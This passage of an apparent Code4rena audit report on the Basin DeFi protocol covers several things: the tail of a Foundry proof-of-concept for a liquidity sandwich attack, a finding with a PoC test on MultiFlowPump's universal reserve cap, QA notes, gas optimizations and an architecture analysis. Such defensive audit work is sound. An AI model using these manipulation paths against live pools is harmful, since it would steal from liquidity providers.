        assertTrue(attackerBalanceAfter.tokens[0] - attackerBalanceBefore.tokens[0] > liquidityProviderBalanceBefore.tokens[0] * 28 / 100);
    }
}
```

The test above can be implemented in the Basin test suite and is executable with the following command:

```solidity
forge test --match-test test_add_liquidity_sandwich_attack
```

### Tools Used

Foundry, VSCode

### Recommended Mitigation Steps

Investigating the math behind this function further and writing tests for this edge case is necessary. A potential fix could be forcing users to provide liquidity in the current ratio of the reserves.

 > This can be mitigated through the use of the `minLpAmountOut` parameter in the function (If the attacker changes the ratio of reserves in the pool, then the number of LP tokens the user receives will be different).

### Impact

When multiple tokens are handled in MultiFlowPump.sol, during trading, the pump might either unfairly reflects volatile assets to be more stale than normal trading activities, Or may fail to have any effects on relatively more stable assets.

This could distort SMA and EMA token reserve values and unfairly reflect some token prices because it uses a one-size-fits-all approach to multiple token asset prices indiscriminate of their normal volatility levels.

### Proof of Concept

In MultiFlowPump.sol, a universal cap of maximum percentage change of a token reserve is set up as immutable variables - `LOG_MAX_INCREASE` and `LOG_MAX_DECREASE`. These two values are benchmarks for all tokens handled by the pump and are used to cap token reserve change per block in `_capReserve()`. And this cap is applied and checked on every single `update()` invoked by Well.sol.

```solidity
//MultiFlowPump.sol
    bytes16 immutable LOG_MAX_INCREASE;
    bytes16 immutable LOG_MAX_DECREASE;
```

```solidity
//MultiFlowPump.sol-update()
...
  for (uint256 i; i < numberOfReserves; ++i) {
            // Use a minimum of 1 for reserve. Geometric means will be set to 0 if a reserve is 0.
|>            pumpState.lastReserves[i] = _capReserve(
                pumpState.lastReserves[i], (reserves[i] > 0 ? reserves[i] : 1).fromUIntToLog2(), blocksPassed
            );
...
```

```solidity
//MultiFlowPump.sol-_capReserve()
...
        if (lastReserve.cmp(reserve) == 1) {
|>            bytes16 minReserve = lastReserve.add(blocksPassed.mul(LOG_MAX_DECREASE));
            // if reserve < minimum reserve, set reserve to minimum reserve
            if (minReserve.cmp(reserve) == 1) reserve = minReserve;
        }
        // Rerserve Increasing or staying the same.
        else {
|>            bytes16 maxReserve = blocksPassed.mul(LOG_MAX_INCREASE);
            maxReserve = lastReserve.add(maxReserve);
            // If reserve > maximum reserve, set reserve to maximum reserve
            if (reserve.cmp(maxReserve) == 1) reserve = maxReserve;
        }
        cappedReserve = reserve;
...
```

As seen from above, whenever a token reserve change is over the percentage dictated by `LOG_MAX_INCREASE` or `LOG_MAX_DECREASE`, the token reserve change will be capped at the maximum percentage and rewritten as calculated `minReserve` or `maxReserve` value. This is fine if the pump is only managing one trading pair(two tokens) because their trading volatility level can be determined.

However, this is highly vulnerable when multiple trading pairs and multiple token assets are handled by a pump. And this is the intended scenario, which can be seen in Well.sol `_updatePumps()` where all token reserves handled by well will be passed to MultiFlowPump.sol. In this case, either volatile tokens will become more stale compared to their normal trading activities, or some stable tokens are allowed to deviate more than their normal trading activities which are vulnerable to exploits.

See POC below as an example to show the above scenario. Full test file [here](https://gist.github.com/bzpassersby/bae15f0dec2ed656758ff468b734ec07).

```solidity
//Pump.HardCap.t.sol

        mWell = new MockReserveWell();
        initUser();
        pump = new MultiFlowPump(

            from18(0.333333333333333333e18),
            12,
            from18(0.9e18)
        );
    }

    function test_HardCap() public {
        uint256[] memory initReserves = new uint256[](4);
        //initiate for mWell and pump
        initReserves[0] = 100e8; //wBTC
        initReserves[1] = 1600e18; //wETH
        initReserves[2] = 99000e4; //USDC
        initReserves[3] = 98000e4; //USDT

        increaseTime(12);
        //Reserve update
        uint256[] memory updateReserves = new uint256[](4);
        updateReserves[0] = 160e8; //wBTC
        updateReserves[1] = 1000e18; //wETH
        updateReserves[2] = 96000e4; //USDC
        updateReserves[3] = 101000e4; //USDT
        mWell.update(address(pump), updateReserves, new bytes(0));
        // lastReserves0 reflects initReserves[i]
        uint256[] memory lastReserves0 = pump.readLastReserves(address(mWell));
        increaseTime(12);
        mWell.update(address(pump), updateReserves, new bytes(0));
        // lastReserves1 reflects 1st reserve update
        uint256[] memory lastReserves1 = pump.readLastReserves(address(mWell));
        assertEq(
            ((lastReserves1[0] - lastReserves0[0]) * 1000) / lastReserves0[0],
            500
        ); //wBTC: 50% reserve change versus 60% reserve change in well
        console.log(lastReserves1[0]); //14999999999
        assertEq(
            ((lastReserves0[1] - lastReserves1[1]) * 1000) / lastReserves0[1],
            333
        ); //wETH: 33% reserve change versus 37.5% reserve change in well
        console.log(lastReserves1[1]); //1066666666666666667199
        assertApproxEqAbs(lastReserves1[2], 96000e4, 1); //USDC: reserve change matches well, 3% change decrease
        assertApproxEqAbs(lastReserves1[3], 101000e4, 1); //USDT: reserve change matches well, 3% reserve increase
    }
...
```

As seen in POC, USDT/USDC reserve changes of more than 3% are allowed, whereas WBTC/WETH reserve changes are restricted. The test is based on 50% for max percentage per block increase and 33% max percentage per block decrease. Although the exact percentage change settings can be different and the actual token reserve changes per block differ by assets, the idea is such universal cap value likely will not fit multiple tokens or trading pairs. The cap can be either set too wide which is then no need to have a cap at all, or be set in a manner that restricts some volatile token assets.

See test results.

### Tools Used

VS Code.

### Recommended Mitigation Steps

Different assets have different levels of volatility, and such variations in volatility are typically taken into account in an AMM or oracle. (Think UniswapV3 with different tick spacings, or chainlink with different price reporting intervals).

Itâ€™s better to avoid setting up `LOG_MAX_INCREASE`, `LOG_MIN_INCREASE` directly in MultiFlowPump.sol.

(1) Instead, in Well.sol allow `MAX_INCREASE` and `MAX_DECREASE` to be token specific and included as part of the immutable data created at the time of Well.sol development from Aquifer.sol, such that a token address can be included together with `MAX_INCREASE` and `MAX_DECREASE` as immutable constants.

(2) Then in `_updatePumps()`, pass current token reserves, and pass token `MAX_INCREASE` and `MAX_DECREASE` as `_pump.data` to MultiFlowPump.sol `update()`.

(3) In MultiFlowPump.sol `update()` , when calculating `_capReserve()` , use decoded `_pump.data` to pass `MAX_INCREASE`, `MAX_DECREASE` for token specific cap calculation.

## [[M-13] Useless Modifier and Bad Assumptions in Constructor ](https://github.com/code-423n4/2023-07-basin-findings/issues/10)
*Submitted by [erebus](https://github.com/code-423n4/2023-07-basin-findings/issues/10)*

Useless modifier in consructor here (even the constructor is empty, just why the modifier there, it makes no sense)

### Proof of Concept
Bad assumptions to calculate the number of block passed here. BLOCK_TIME is an immutable variable which is passed as a parameter to the constructor. However, with future updates to the Ethereum protocol (IDK, reth or other validation algorithm) which could reduce that number would mean that functions dependant on that to work incorrectly like readInstantaneousReserves or _readCumulativeReserves. 

### Mitigation Steps
Do not assume the block rate to remain constant in the future or implement some function that modifies the BLOCK_TIME every T seconds/minutes/whatever. 


**[alcueca (Judge) increased severity to Medium](https://github.com/code-423n4/2023-07-basin-findings/issues/10#issuecomment-1666616238)**

**[publiuss (Basin) acknowledged and commented](https://github.com/code-423n4/2023-07-basin-findings/issues/10#issuecomment-1666616238)**
>First QA item is acknowledged. The modifier is there to initialize the `ReentrancyGuard` contract. Imo, its cleaner to have an empty constructor than to have no constructor and have the user realize that it uses the `ReentrancyGuard` modifier by defualt. This item is a duplicate of other QA reports.

 >Second QA item is a duplicate of: #176. See comment on issue for remediation status.

## 1. No need to write `Aquifer.sol/wellImplementation()` getter function instead make the mapping `wellImplementations` as a public state variable.

wellImplementations : https://github.com/code-423n4/2023-07-basin/blob/main/src/Aquifer.sol#L25
Aquifer.sol/wellImplementation() : https://github.com/code-423n4/2023-07-basin/blob/main/src/Aquifer.sol#L86


## 2. No need to introduce a new local variable in this function `Well.sol/tokens()`, directly return the tokens array.
This is the optimised code

https://github.com/code-423n4/2023-07-basin/blob/main/src/Well.sol#L84

``` Solidity
    function tokens() public pure returns (IERC20[] memory) {         
        return _getArgIERC20Array(LOC_VARIABLE, numberOfTokens());
    }
```

## 3. `Well.sol/_swapFrom()` function using the some lines of code same as written in another function `getSwapOut()`, which is increasing the codesize and deployment cost, instead call the function `getSwapOut()` inside the `_swapFrom()`

https://github.com/code-423n4/2023-07-basin/blob/main/src/Well.sol#L222C9-L228C80

https://github.com/code-423n4/2023-07-basin/blob/main/src/Well.sol#L246C9-L253C92

## 4. `Well.sol/swapTo()` function using the some lines of code same as written in another function `getSwapIn()`, which is increasing the codesize and deployment cost, instead call the function `getSwapIn()` inside `swapTo()`

https://github.com/code-423n4/2023-07-basin/blob/main/src/Well.sol#L272C9-L278C80

https://github.com/code-423n4/2023-07-basin/blob/main/src/Well.sol#L312C9-L318C91

## 5. Function `Well.sol/_getIJ()` will always revert for two equal token addresses due to an if-else condition.
https://github.com/code-423n4/2023-07-basin/blob/main/src/Well.sol#L742

Rather change the `else if` to `if`

## 6. In `MultiFlowPump.sol/update()` use `slot.readLastReserves()` to get the value of `numberOfReserves` instead of using `reserves.length`

https://github.com/code-423n4/2023-07-basin/blob/main/src/pumps/MultiFlowPump.sol#L73C9-L80C87

A better version of `update()` function can be this 
```Solidity
    function update(uint256[] calldata reserves, bytes calldata) external {
        PumpState memory pumpState;

        // All reserves are stored starting at the msg.sender address slot in storage.
        bytes32 slot = _getSlotForAddress(msg.sender);

        // Read: Last Timestamp & Last Reserves
        (uint256 numberOfReserves , pumpState.lastTimestamp, pumpState.lastReserves) = slot.readLastReserves();
```

## 7. The non-zero reserve condition is used in `MultiFlowPump.sol/_init()` and  `MultiFlowPump.sol/update()`. Since `_init()` function is called by only `upadate()` function, this will be waste to check this same validation two times 

Recommendation : remove any of these check occurrence.

https://github.com/code-423n4/2023-07-basin/blob/main/src/pumps/MultiFlowPump.sol#L86

https://github.com/code-423n4/2023-07-basin/blob/main/src/pumps/MultiFlowPump.sol#L153

## 8. Can use `numberOfReserves` instead of `byteReserves.length`, this saves the calculation of `bytesReserves.length` in `MultiFlowPump.sol/_init()`

https://github.com/code-423n4/2023-07-basin/blob/main/src/pumps/MultiFlowPump.sol#L162

## 9. `MultiFlowPump.sol/_capReserve()` can be set as a `pure` function since this doesn't view any state of chain.

https://github.com/code-423n4/2023-07-basin/blob/main/src/pumps/MultiFlowPump.sol#L199

## 10. Minor typo in commenting in `MultiFlowPump.sol/_capReserve()`

https://github.com/code-423n4/2023-07-basin/blob/main/src/pumps/MultiFlowPump.sol#L210

## 11. Better to declare the return variable as `emaReserves` instead of `reserves` as it gives more information about the return value in `MultiFlowPump.sol/readLastInstantaneousReserves()`

https://github.com/code-423n4/2023-07-basin/blob/main/src/pumps/MultiFlowPump.sol#L222

## 12. updating `lastReserves[i]` by using `_capReserves()` is not consistent in functions `MultiFlowPump.sol/readInstantaneousReserves()` and `MultiFlowPump.sol/update()`

https://github.com/code-423n4/2023-07-basin/blob/main/src/pumps/MultiFlowPump.sol#L119

https://github.com/code-423n4/2023-07-basin/blob/main/src/pumps/MultiFlowPump.sol#L256

## 13. Better to declare the return variable as `cumulativeReserves` instead of `reserves` as it gives more information about the return value in `MultiFlowPump.sol/readLastCumulativeReserves()`

https://github.com/code-423n4/2023-07-basin/blob/main/src/pumps/MultiFlowPump.sol#L267

## 14. No need to introduce a new local variable in this function `MultiFlowPump.sol/readCumulativeReserves()`, directly return the tokens array.

https://github.com/code-423n4/2023-07-basin/blob/main/src/pumps/MultiFlowPump.sol#L280

directly return using 
```solidity
    return abi.encode(byteCumulativeReserves);
```

# Gas Optimizations

## [G-01] Access mappings directly rather than using accessor functions
When you have a mapping, accessing its values through accessor functions involves an additional layer of indirection, which can incur some gas cost. This is because accessing a value from a mapping typically involves two steps: first, locating the key in the mapping, and second, retrieving the corresponding value.

```solidity
File: /src/Aquifer.sol
87    return wellImplementations[well];
```
https://github.com/code-423n4/2023-07-basin/blob/main/src/Aquifer.sol#L87


## [G-02] public functions not called by the contract should be declared external instead
 when a function is declared as public, it is generated with an internal and an external interface. This means the function can be called both internally (within the contract) and externally (by other contracts or accounts). However, if a public function is never called internally and is only expected to be invoked externally, it is more gas-efficient to explicitly declare it as external.


```solidity
File: /src/Well.sol
31    function init(string memory name, string memory symbol) public initializer {
```
https://github.com/code-423n4/2023-07-basin/blob/main/src/Well.sol#L31

```solidity
File: /src/pumps/MultiFlowPump.sol
222    function readLastInstantaneousReserves(address well) public view returns (uint256[] memory reserves) {

239     function readInstantaneousReserves(address well, bytes memory) public view returns (uint256[] memory emaReserves) {

267     function readLastCumulativeReserves(address well) public view returns (bytes16[] memory reserves) {

280     function readCumulativeReserves(address well, bytes memory) public view returns (bytes memory cumulativeReserves) {

307   function readTwaReserves(                
```

## [G-03] Amounts should be checked forÂ 0Â before calling a transfer

It can be beneficial to check if an amount is zero before invoking a transfer function, such as transfer or safeTransfer, to avoid unnecessary gas costs associated with executing the transfer operation. If the amount is zero, the transfer operation would have no effect, and performing the check can prevent unnecessary gas consumption.


```solidity
File: /src/Well.sol
370   tokenOut.safeTransfer(recipient, amountOut);

447   _tokens[i].safeTransfer(recipient, tokenAmountsOut[i]);

512    tokenOut.safeTransfer(recipient, tokenAmountOut);

558    _tokens[i].safeTransfer(recipient, tokenAmountsOut[i]);

780    token.safeTransferFrom(from, address(this), amount);
```
https://github.com/code-423n4/2023-07-basin/blob/main/src/Well.sol#L370

https://github.com/code-423n4/2023-07-basin/blob/main/src/Well.sol#L447

https://github.com/code-423n4/2023-07-basin/blob/main/src/Well.sol#L512

https://github.com/code-423n4/2023-07-basin/blob/main/src/Well.sol#L558

https://github.com/code-423n4/2023-07-basin/blob/main/src/Well.sol#L780



## [G-04] With assembly,Â .call (bool success)Â transfer can be done gas-optimized

ReturnÂ dataÂ (bool success,)Â has to be stored due to EVM architecture, but in a usage like below, â€˜outâ€™ and â€˜outsizeâ€™ values are given (0,0), this storage disappears and gas optimization is provided.
   (bool success,) = dest.call{value:amount}("");
 bool success; 
 assembly {  
            success := call(gas(), dest, amount, 0, 0)
     }  

```solidity
File: /src/Aquifer.sol
55   (bool success, bytes memory returnData) = well.call(initFunctionCall);
```
https://github.com/code-423n4/2023-07-basin/blob/main/src/Aquifer.sol#L55

## [G-05] Use constants instead of type(uintx).max
using type(uintx).max can result in higher gas costs because it involves a runtime operation to calculate the maximum value at runtime. This calculation is performed every time the expression is evaluated.

To save gas, it is recommended to use constants instead of type(uintx).max to represent the maximum value. By declaring a constant with the maximum value, the value is known at compile-time and does not require any runtime calculations.

```solidity
File: /src/libraries/LibBytes.sol
40  require(reserves[0] <= type(uint128).max, "ByteStorage: too large");

41  require(reserves[1] <= type(uint128).max, "ByteStorage: too large");

49  require(reserves[2 * i] <= type(uint128).max, "ByteStorage: too large");

50  require(reserves[2 * i + 1] <= type(uint128).max, "ByteStorage: too large");

63  require(reserves[reserves.length - 1] <= type(uint128).max, "ByteStorage: too large");
```

## [G-06] Duplicated require()/if() checks should be refactored to a modifier or function

It is common to use require() or if() statements to validate certain conditions before executing specific code. However, when the same checks are repeated multiple times within a contract, it can result in redundant code and unnecessary gas consumption.
To save gas and improve code readability and maintainability, it is recommended to refactor duplicated checks into modifiers or functions. By doing so, the checks can be abstracted into reusable code blocks that can be applied to multiple functions within the contract.

## [G-07]Â x += yÂ costs more gas thanÂ x = x + yÂ for state variables

## [G-08] Remove theÂ initializerÂ modifier

If we can just ensure that theÂ initialize()Â function could only be called from within the constructor, we shouldnâ€™t need to worry about it getting called again.

```solidity
File: /src/Well.sol
31    function init(string memory name, string memory symbol) public initializer {
```
https://github.com/code-423n4/2023-07-basin/blob/main/src/Well.sol#L31

## [G-09] Replace state variable reads and writes within loops with local variable reads and writes.
When accessing state variables within loops, each read or write operation incurs additional gas costs due to the storage and memory access operations involved. These costs can accumulate quickly, particularly in loops with a large number of iterations.


```solidity
File: /src/Well.sol
101        for (uint256 i; i < _pumps.length; i++) {
            _pumps[i].target = _getArgAddress(dataLoc);
            dataLoc += PACKED_ADDRESS;
            pumpDataLength = _getArgUint256(dataLoc);
            dataLoc += ONE_WORD;
            _pumps[i].data = _getArgBytes(dataLoc, pumpDataLength);
            dataLoc += pumpDataLength;
        }
```
https://github.com/code-423n4/2023-07-basin/blob/main/src/Well.sol#L101-L108  


## [G-10] Multiple accesses of a mapping/array should use a storage pointer
Caching a mappingâ€™s value in a storage pointer when the value is accessed multiple times saves ~40 gas per access due to not having to perform the same offset calculation every time. Help the Optimizer by saving a storage variableâ€™s reference instead of repeatedly fetching it.

To achieve this, declare a storage pointer for the variable and use it instead of repeatedly fetching the reference in a map or an array. As an example, instead of repeatedly calling _pumps[i], save its reference via a storage pointer: _pumpsInfo storage pumpsInfo = _pumps[i] and use the pointer instead.



Cache storage pointers for _pumps[i]

            packedPumps = abi.encodePacked(
                packedPumps,            // previously packed pumps
                _pumps[i].target,       // pump address
                _pumps[i].data.length,  // pump data length
                _pumps[i].data          // pump data (bytes)
            );


74         name = string.concat(name, ":", LibContractInfo.getSymbol(address(_tokens[i])));
            symbol = string.concat(symbol, LibContractInfo.getSymbol(address(_tokens[i])));

## [G-11]   Using bools for storage incurs overhead

    // Booleans are more expensive than uint256 or any type that takes up a full
    // word because each write operation emits an extra SLOAD to first read the
    // slot's contents, replace the bits taken up by the boolean, and then write
    // back. This is the compiler's defense against contract upgrades and
    // pointer aliasing, and it cannot be disabled.

Use uint256(1) and uint256(2) for true/false to avoid a Gwarmaccess (100 gas) for the extra SLOAD, and to avoid Gsset (20000 gas) when changing from false to true, after having been true in the past.

## [G-12]   String literals passed to abi.encode()/abi.encodePacked() should not be split by commas
String literals can be split into multiple parts and still be considered as a single string literal. Adding commas between each chunk makes it no longer a single string, and instead multiple strings. EACH new comma costs 21 gas due to stack operations and separate MSTOREs.

## [G-14] Call block.timestamp direclty instead of function

https://github.com/code-423n4/2023-07-basin/blob/main/src/pumps/MultiFlowPump.sol#L297

## [G-15] Using fixed bytes is cheaper than using string

As a rule of thumb, use bytes for arbitrary-length raw byte data and string for arbitrary-length string (UTF-8) data.
If you can limit the length to a certain number of bytes, always use one of bytes1 to bytes32 because they are much cheaper.

## [G-16]  Not using the named return variables when a function returns, wastes deployment gas

### Recommended Code

## [G-17] Use assembly for math (add, sub, mul, div)

Use assembly for math instead of Solidity. You can check for overflow/underflow in assembly to ensure safety. If using Solidity versions < 0.8.0 and you are using Safemath, you can gain significant gas savings by using assembly to calculate values and checking for overflow/underflow.

# Audit Analysis

For this audit, 7 analysis reports were submitted by wardens. An analysis report examines the codebase as a whole, providing observations and advice on such topics as architecture, mechanism, or approach. The [report highlighted below](https://github.com/code-423n4/2023-07-basin-findings/issues/175) by **Trust** received the top score from the judge.

*The following wardens also submitted reports: [peanuts](https://github.com/code-423n4/2023-07-basin-findings/issues/236), [0xSmartContract](https://github.com/code-423n4/2023-07-basin-findings/issues/218), [Eeyore](https://github.com/code-423n4/2023-07-basin-findings/issues/213), [oakcobalt](https://github.com/code-423n4/2023-07-basin-findings/issues/66), [glcanvas](https://github.com/code-423n4/2023-07-basin-findings/issues/131), and [K42](https://github.com/code-423n4/2023-07-basin-findings/issues/27).*


**General**

I've spent 2-3 days on this audit and covered the code in scope. Having been audited twice by private firms, I expected there to be very little in terms of low-hanging fruits.

**Approach**

Most of the focus was on deeply understanding the assembly optimizations and particular LP mechanics, informally proving their correctness and so on. Differential analysis between Basin and Uniswap was helpful for this task.

**Architecture recommendations**

The platform supports a very generic well implementation, and as the team understands, this leads to a broad variety of malicious deployed well risks. It should be a high priority task for the team to find good ways of representing all Well trust assumptions to its users, and expose that through a smart contract UI or an open source front-end library.

**Qualitative analysis**

Code quality and documentation is very mature. The test suite is pretty comprehensive and fuzz tests are a great way to complement the static tests. My suggestion is to add integration tests to verify behavior of the system as a whole, rather than all its specific sub-components.

**Centralization risks**

None. The architecture is fully permissionless.

**Systemic risks**

MEV and TWAP manipulation are the main systemic risks. Interacting with Wells registered in the Aquifer could possibly be risky, depending on the well's configuration.

The immutability of the Pump and Well co-efficients, such as LOG_MAX_INCREASE and ALPHA, present a systemic risk as time progresses and the optimal values start diverging.

As the entire platform is unupgradeable, migration in the event of a security hole or a black swan event will be challenging. The team should prepare multiple recovery scenarios and set up adequate action channels to prepare for such eventualities.
